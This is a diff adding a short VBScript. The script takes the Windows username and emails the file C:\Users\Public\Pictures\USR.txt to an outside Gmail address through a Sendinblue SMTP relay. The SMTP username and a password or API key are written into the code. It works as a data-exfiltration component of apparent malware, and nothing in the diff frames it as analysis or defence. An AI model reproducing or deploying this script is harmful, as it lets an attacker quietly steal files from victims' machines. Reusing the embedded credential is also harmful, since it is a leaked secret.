@@ -1,0 +1,19 @@
+Set wshShell = WScript.CreateObject("WScript.Shell")
+strUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")
+strUser = CreateObject("WScript.Network").UserName
+Set emailObj      = CreateObject("CDO.Message")
+emailObj.From     = "newojr0@gmail.com"
+emailObj.To       = "okn332536@gmail.com"
+emailObj.Subject  = strUserName
+emailObj.TextBody = "word.bat"
+emailObj.AddAttachment "C:\Users\Public\Pictures\USR.txt"
+Set emailConfig = emailObj.Configuration
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp-relay.sendinblue.com"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = false 
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "personalsender.exe@gmail.com"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "xsmtpsib-3a6be9740be72f930c6a08e92d06ce34475ab12bd549faf30f44ce62c0afecab-q9sSbTDwPatKHZ0X"
+emailConfig.Fields.Update
+emailObj.Send
